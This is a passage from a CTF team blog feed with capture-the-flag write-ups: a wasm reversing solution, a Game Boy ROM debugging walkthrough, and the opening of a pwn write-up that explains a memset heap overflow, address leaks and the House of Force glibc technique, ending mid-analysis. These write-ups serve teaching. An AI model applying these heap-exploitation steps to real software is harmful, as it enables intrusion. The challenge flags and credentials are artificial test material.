check(u32 p0, u32 p1)</strong>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> u32 <span class="title">check</span><span class="params">(u32 p0, u32 p1)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">populate();</span><br><span class="line">i0 = hxp2019__check__h578f31d490e10a31(i0, i1);</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>Now modifying <strong>hxp2019__check__h578f31d490e10a31</strong>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> u32 <span class="title">hxp2019__check__h578f31d490e10a31</span><span class="params">(u32 p0, u32 p1)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s"</span>,<span class="string">"hxp&#123;"</span>); <span class="comment">// print flag header</span></span><br><span class="line">  ...</span><br><span class="line">  i0 = i32_load8_u((&amp;memory), (u64)(i0));</span><br><span class="line">  i1 = l6;</span><br><span class="line">  i2 = <span class="number">255u</span>;</span><br><span class="line">  i1 &amp;= i2;</span><br><span class="line">  i1 = i0; <span class="comment">// make the condition always true</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%c"</span>, i1); <span class="comment">// print current flag character</span></span><br><span class="line">  i0 = i0 == i1; <span class="comment">// condition</span></span><br><span class="line">  <span class="keyword">if</span> (i0) &#123;<span class="keyword">goto</span> L7;&#125; <span class="comment">// continue with the loop</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"&#125;"</span>);</span><br><span class="line">  <span class="keyword">return</span> i0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>You can download the files <a href="https://mega.nz/#!uyRggIrK!_gls6GiG6aHIeE4xhpA2kWMmiu_acMfXXQE96TIJecA" target="_blank" rel="noopener">here</a>.</p><p>Now compiling everything with make:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ make</span><br><span class="line">gcc -c -o hxp2019_bg.o hxp2019_bg.c -I. -ggdb -m32</span><br><span class="line">gcc -c -o wasm-rt-impl.o wasm-rt-impl.c -I. -ggdb -m32</span><br><span class="line">gcc -c -o main.o main.c -I. -ggdb -m32</span><br><span class="line">gcc -o main hxp2019_bg.o wasm-rt-impl.o main.o -I. -ggdb -m32</span><br></pre></td></tr></table></figure><p>Running and getting the flag:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ./main 1048576 50</span><br><span class="line">hxp&#123;merry_xmas___github.com/benediktwerner/rewasm&#125;</span><br><span class="line">check(1048576,50) -&gt; 1</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;xmas_future&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Points&lt;/strong&gt;&lt;br&gt;96&lt;br&gt;&lt;strong&gt;Solves&lt;/strong&gt;&lt;br&gt;95&lt;br&gt;&lt;strong&gt;Category&lt;/stro
      
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="wasm" scheme="https://teamrocketist.github.io/tags/wasm/"/>
    
      <category term="36c3" scheme="https://teamrocketist.github.io/tags/36c3/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] Kipod2019 - GameBob</title>
    <link href="https://teamrocketist.github.io/2019/12/26/Reverse-Kipod2019-GameBob/"/>
    <id>https://teamrocketist.github.io/2019/12/26/Reverse-Kipod2019-GameBob/</id>
    <published>2019-12-26T12:31:45.000Z</published>
    <updated>2022-08-23T23:01:48.887Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>GameBob</strong></p><p><strong>Points</strong><br>80<br><strong>Solves</strong><br>16<br><strong>Category</strong><br>Reverse</p><p><strong>Description:</strong><br>I built that small GameBoy program that just prints out the flag, and I don’t think I forgot anything. </p><p><a href="https://mega.nz/#!TupElSJa!Qs-W4_Ex3cqxmAXZlMt7Ndr0Kv-ybxZ9zTV40qfZrpM" target="_blank" rel="noopener">GameBob.gb</a><br><a href="https://mega.nz/#!yiwAyYKI!ff4asDkWe5U-Yj1CSjCS0mrH_oaX-2uw69czEvSTgVM" target="_blank" rel="noopener">GameBob.sym</a></p></blockquote><p>We have both GameBob.gb ROM and GameBob.sym which containts the symbol names to the functions which will help a lot on the reverse job.</p><p>Unlike in a previous <a href="https://teamrocketist.github.io/2017/10/16/Reverse-Square-CTF-The-Turing-Agent/">write up</a> I actually managed to work with <a href="http://bgb.bircd.org/" target="_blank" rel="noopener">bdb</a> which is a much better debugger than <a href="http://problemkaputt.de/gmb.htm" target="_blank" rel="noopener">No\$GMB</a>. <strong>bgb</strong> not only has more options that also doesn’t have some random crashes that I was experience with No$GMB. Actually <strong>bgb</strong> is works in a very similar way.</p><p>Here are some of the shortcuts I used while using this debugger:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">F2 - Break Point</span><br><span class="line">F3 - Step</span><br><span class="line">F6 - Jump to Cursor (Modifies the PC(program counter) register to the address at the cursor) </span><br><span class="line">CTRL + F - Search for a string (nice to search for symbol names)</span><br><span class="line">CTRL + G - Jump to specified address</span><br></pre></td></tr></table></figure><p>After opening <strong>bgb</strong> we right click on the window to load the <strong>ROM</strong>, after that the game will start playing but the debugger window won’t show up unless we right click again (other -&gt; Debugger):<br><a data-fancybox="gallery" href="https://i.imgur.com/rXTM5i2.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/rXTM5i2.png" alt><br></a></p><p>Since we have symbols to find the main function we can just use <strong>CTRL+F</strong> and search for <strong>main</strong>, then just put a break point in the beginning with <strong>F2</strong>, note that while we are focusing the Debugger Window the game is frozen but if we click on the game window the game runs it works like a continue instruction in gdb:<br><a data-fancybox="gallery" href="https://i.imgur.com/p45TGVg.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/p45TGVg.png" alt><br></a><br>After inserting the breakpoint at the main and do some steps with <strong>F3</strong> right before executing the .</p><p>If we step over from <strong>call print_string_delayed</strong> we will see that the parameters passed to this function is the string that will be printed (“Welcome to the Game Bob”):<br><a data-fancybox="gallery" href="https://i.imgur.com/3sq40kr.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/3sq40kr.png" alt><br></a><br>If we do a few more steps we can see and after stepping over the 2nd <strong>print_string_delayed</strong> the string printed to the string will be “It’s a really easy challenge, so here is your flag”:<br><a data-fancybox="gallery" href="https://i.imgur.com/IazvRvJ.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/IazvRvJ.png" alt><br></a><br>After this a stack is created at the global flag_stack (D000):<br><a data-fancybox="gallery" href="https://i.imgur.com/UqScEDb.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/UqScEDb.png" alt><br></a></p><p>Using <strong>CTRL+G</strong> on the hexviewer to watch memory region at (D000):<br><a data-fancybox="gallery" href="https://i.imgur.com/S0RnHct.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/S0RnHct.png" alt><br></a><br>After doing multiple calls after executing <strong>call print_stack</strong> we can view in memory that multiple characters were pushed into the stack this were encrypted flag characters:<br><a data-fancybox="gallery" href="https://i.imgur.com/cSDZStr.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/cSDZStr.png" alt><br></a><br>So obviously something is missing after looking at the file with the symbols I found a function with a suspicious name called <strong>_secret</strong> which basically pops the encrypted characters from the stack and pushes the decrypted flag characters. There are no calls to this function so one of the solutions would be to patch the file, perhaps I didn’t resorted to this solution, instead I just used jumps to jump to <strong>_secret</strong> function before the arguments of <strong>print_stack</strong> call:<br><a data-fancybox="gallery" href="https://i.imgur.com/KmVsbVO.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/KmVsbVO.png" alt><br></a><br>This can be done by using the functionality <strong>jump to cursor</strong> (Shortcut F6) that the debugger offers, we could also changed the register manually at the top right corner where the registers are shown:<br><a data-fancybox="gallery" href="https://i.imgur.com/UwAANmD.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/UwAANmD.png" alt><br></a><br>Putting a break point at the end of the function (ret instruction located at 0x4da) we can see new items were pushed into the stack:<br><a data-fancybox="gallery" href="https://i.imgur.com/tLka9AU.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/tLka9AU.png" alt><br></a><br>Now jumping back back to main using <strong>jump to cursor</strong><br><a data-fancybox="gallery" href="https://i.imgur.com/UWx2ZpP.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/UWx2ZpP.png" alt><br></a><br>Now doing a couple of steps <strong>print_stack</strong> will execute and print the flag into the screen:<br><a data-fancybox="gallery" href="https://i.imgur.com/zd7d1t2.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/zd7d1t2.png" alt><br></a></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;GameBob&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Points&lt;/strong&gt;&lt;br&gt;80&lt;br&gt;&lt;strong&gt;Solves&lt;/strong&gt;&lt;br&gt;16&lt;br&gt;&lt;strong&gt;Category&lt;/strong&gt;&lt;
      
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
      <category term="kipod2019" scheme="https://teamrocketist.github.io/tags/kipod2019/"/>
    
      <category term="gameboy" scheme="https://teamrocketist.github.io/tags/gameboy/"/>
    
      <category term="no$gmb" scheme="https://teamrocketist.github.io/tags/no-gmb/"/>
    
      <category term="bgb" scheme="https://teamrocketist.github.io/tags/bgb/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] Kipod2019 - CloneWarS</title>
    <link href="https://teamrocketist.github.io/2019/12/26/Pwn-Kipod2019-CloneWarS/"/>
    <id>https://teamrocketist.github.io/2019/12/26/Pwn-Kipod2019-CloneWarS/</id>
    <published>2019-12-26T04:28:38.000Z</published>
    <updated>2022-08-23T00:14:55.165Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>CloneWarS</strong></p><p><strong>Points</strong><br>90<br><strong>Solves</strong><br>13<br><strong>Category</strong><br>Pwn</p><p><strong>Description:</strong><br>A long time ago in a galaxy far, far away….  </p><p>ssh <a href="mailto:yeet@ctf2.kaf.sh" target="_blank" rel="noopener">yeet@ctf2.kaf.sh</a> -p 7000 password: 12345678<br><a href="https://mega.nz/#!66gyyYyB!g4AAJRtZFLVwLvlJtTGx9d-IT3prL9EDdI62hrShpDk" target="_blank" rel="noopener">CloneWarS</a></p></blockquote><h3 id="TLDR"><a href="#TLDR" class="headerlink" title="TLDR"></a>TLDR</h3><ul><li>Leak heap from R2D2</li><li>Overflow top_chunk size</li><li>Leak global file pointer</li><li>Use house of force to write into file</li><li>Trigger system(file)</li></ul><h3 id="Binary-Analysis"><a href="#Binary-Analysis" class="headerlink" title="Binary Analysis"></a>Binary Analysis</h3><p>The binary is the only file we get from this challenge:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file CloneWarS</span><br><span class="line">CloneWarS: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=a45e46d5347deb6022d64604638a3ed70e8de417, not stripped</span><br></pre></td></tr></table></figure><p>From the <strong>file</strong> command output we know that:</p><ul><li>ELF compiled for x86_x64 architecture</li><li>Dynamically linked</li><li>Not stripped</li></ul><p>Using <strong>checksec</strong> to see the enabled protections:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec CloneWarS</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/CloneWarS/CloneWarS'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><ul><li><strong>FULL RELRO</strong> (GOT entries are read only we can’t overwrite them)</li><li><strong>STACK CANARY</strong> (The stack is protected with the canary if there is a stack overflow we need to find a way to leak it)</li><li><strong>NX</strong> (Non executable stack)</li><li><strong>PIE</strong> (Position Independent Executable) is on (If we want to use rop we need a way to leak the base address)</li></ul><h3 id="Static-Analysis"><a href="#Static-Analysis" class="headerlink" title="Static Analysis"></a>Static Analysis</h3><p>Using Ida to check on the main function we can see we have a bunch of options:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( v3 != <span class="number">7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1L</span>L:</span><br><span class="line">        build_death_star(); <span class="comment">// option 1</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2L</span>L:</span><br><span class="line">        R2D2(); <span class="comment">// option 2</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3L</span>L:</span><br><span class="line">        prep_starship(); <span class="comment">// option 3</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4L</span>L:</span><br><span class="line">        make_troopers(); <span class="comment">// option 4</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5L</span>L:</span><br><span class="line">        light_sabers(); <span class="comment">// option 5</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6L</span>L:</span><br><span class="line">        cm2_dark_side(); <span class="comment">// option 6</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>By looking at <strong>build_death_star</strong>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">build_death_star</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  fwrite(<span class="string">"Assemble death star: "</span>, <span class="number">1u</span>LL, <span class="number">0x15</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1); <span class="comment">// We can control the size of the allocated string</span></span><br><span class="line">  <span class="built_in">malloc</span>(v1); <span class="comment">// allocated object (the pointer not saved anywhere)</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>As we can see above we have a controlled sized <strong>malloc</strong> this is important if we want to use certain exploits on the heap.</p><p>By looking at <strong>R2D2</strong>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">R2D2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  fwrite(<span class="string">"R2? "</span>, <span class="number">1u</span>LL, <span class="number">4u</span>LL, <span class="built_in">stderr</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%x"</span>, &amp;v1);</span><br><span class="line">  v2 = (<span class="keyword">char</span> *)starships + <span class="number">272</span>;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nR2D2 IS .... %ld ...... ON THIS TRACK !! 0x6733894F08\n"</span>, (<span class="keyword">char</span> *)starships + <span class="number">272</span>);<span class="comment">// Leak Heap</span></span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>R2D2</strong> gives us a <strong>free leak</strong> to the heap because of this we can calculate the offset to the <strong>HEAP BASE</strong>.</p><p>Checking out theprep_starship:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">prep_starship</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-2Ch]</span></span><br><span class="line">  <span class="keyword">int</span> c; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  fwrite(<span class="string">"Master, the amount of starships: "</span>, <span class="number">1u</span>LL, <span class="number">0x21</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1); <span class="comment">// reads size from the stdin</span></span><br><span class="line">  starships = <span class="built_in">malloc</span>(v1); <span class="comment">// a new allocated starship with a controllable size</span></span><br><span class="line">  c = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  fwrite(<span class="string">"\nWhat kind of starships?: "</span>, <span class="number">1u</span>LL, <span class="number">0x1A</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%x"</span>, &amp;c); <span class="comment">// Value to be set</span></span><br><span class="line">  fwrite(<span class="string">"\nCapacity of troopers in the starships: "</span>, <span class="number">1u</span>LL, <span class="number">0x28</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v3); <span class="comment">// Number of bytes</span></span><br><span class="line">  <span class="built_in">memset</span>(starships, c, v3); <span class="comment">// Heap Overflow</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>As you can see because of <strong>memset</strong> we can overflow the heap by an amount we can control (capacity of the troppers) and we can also control the content that will overflow it (kind of starships).</p><p>Analysing <strong>make_troopers</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">make_troopers</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> *dest; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> src[<span class="number">8</span>]; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fwrite(<span class="string">"\nTroopers to be deployed: "</span>, <span class="number">1u</span>LL, <span class="number">0x1A</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x14</span>uLL); <span class="comment">// content limited to 0x14 bytes</span></span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(v1); <span class="comment">// once again a controllable sized malloc </span></span><br><span class="line">  fwrite(<span class="string">"\nWhat kind of troopers?: "</span>, <span class="number">1u</span>LL, <span class="number">0x19</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">  src[(<span class="keyword">int</span>)((<span class="keyword">unsigned</span> __int64)read(<span class="number">0</span>, src, <span class="number">8u</span>LL) - <span class="number">1</span>)] = <span class="number">0</span>; <span class="comment">// puts a null byte at the (8-1) position of the string</span></span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src); <span class="comment">// puts the content from stdin into the new allocated chunk</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Nothing wrong with this one (in terms of security at least) but this one can be useful to store some content to a certain pointer specially if we manage to make <strong>malloc</strong> return an arbirtrary pointer to a place we want.</p><p><strong>light_sabers</strong> is the same as <strong>make_troopers</strong> but instead of putting a null byte at the 8th position of the read string it puts at the 0x14-1 which is right at the end of the string.</p><p>Analysing <strong>cm2_dark_side</strong>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cm2_dark_side</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nFile is at: %ld\n"</span>, file); <span class="comment">// file pointer leaked</span></span><br><span class="line">  <span class="keyword">return</span> system(file); <span class="comment">// system call</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>file</strong> is a global variable located at the <strong>BSS</strong> once again we get a <strong>free leak</strong> with this we can get the offset to the <strong>pie base</strong> and get access to the rest of the global variables, this function also hints us that the final objective of this challenge is to find a way to change the content of <strong>file</strong> to get a shell or print the flag.</p><h3 id="House-of-force-the-jedi-overflow"><a href="#House-of-force-the-jedi-overflow" class="headerlink" title="House of force the jedi overflow"></a>House of force the jedi overflow</h3><p>It’s not a coincidence that the theme of this challenge is about <strong>star wars</strong>, Obi wan intuitively says to us:<br><a data-fancybox="gallery" href="https://www.memesmonkey.com/images/memesmonkey/8d/8d20c3e75fbde8db715bf58792deba8e.jpeg" target="_blank" rel="noopener"><br><img src="https://www.memesmonkey.com/images/memesmonkey/8d/8d20c3e75fbde8db715bf58792deba8e.jpeg" alt><br></a><br>The ingredients to use <strong>house of force</strong> can be interpreted as follows:</p><ul><li>The exploiter must be able to overwrite the <strong>top chunk</strong>.</li><li>There is a malloc() call with an <strong>exploiter-controllable</strong> size.</li><li>There is another malloc() call where <strong>data</strong> are <strong>controlled</strong> by the exploiter.</li></ul><p>We checked all the requirements:</p><ul><li>We have a <strong>heap-overflow</strong> at the function <strong>prep_starship</strong> through <strong>memset</strong>.</li><li>We have a multiple malloc calls with controllable sizes for example in <strong>build_death_star</strong>.</li><li>We have a malloc call where we can control its data in <strong>make_troopers</strong> and <strong>light_sabers</strong>.</li></ul><p>So the <strong>core</strong> of this attack is to overwrite <strong>av-&gt;top</strong> with an big arbitrary value so it can later force <strong>malloc</strong> (which uses the top chunk) to return an arbitrary pointer to an address we want to modify.</p><p>So what is the <strong>top_chunk</strong> ? <strong>top_chunk</strong> also known as the wilderness is a special chunk that defines how much <strong>space</strong> is <strong>left</strong> in the current <strong>heap arena</strong>, this chunk is located at the top of the heap.<br><a data-fancybox="gallery" href="https://i.imgur.com/qBJ8FFE.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/qBJ8FFE.png" alt><br></a><br>On this sample program we can see right after the first allocation the heap is initialized, the first chunk is the <strong>tc ache_p_struct</strong> next is the allocated chunk by us.<br>Finally right at the top of the heap we have the <strong>wilderness</strong> the space left in the arena is defined in the field <strong>mchunk_size</strong> so lets see what happens when we allocate a 2nd chunk:<br><a data-fancybox="gallery" href="https://i.imgur.com/Kmu5zUW.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/Kmu5zUW.png" alt><br></a><br>When it exceeds the space left, heap <strong>expansion</strong> is triggered mapping a new memory page.</p><p>So what happens when the top chunk is used to allocate the size of the heap block to any value controlled by the user? The answer is that you can make the top chunk point to whatever we want (yes everywhere even in a position before because of overflow), which is equivalent to an arbitrary address write. However, in <a href="https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L2729" target="_blank" rel="noopener">glibc</a>, the size of the user request and the existing size of the top chunk are verified. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Void_t*</span><br><span class="line">_int_malloc(mstate av, <span class="keyword">size_t</span> bytes) &#123;</span><br><span class="line">  INTERNAL_SIZE_T nb;               <span class="comment">/* normalized request size */</span></span><br><span class="line"></span><br><span class="line">  [...]</span><br><span class="line"></span><br><span class="line">  mchunkptr       victim;           <span class="comment">/* 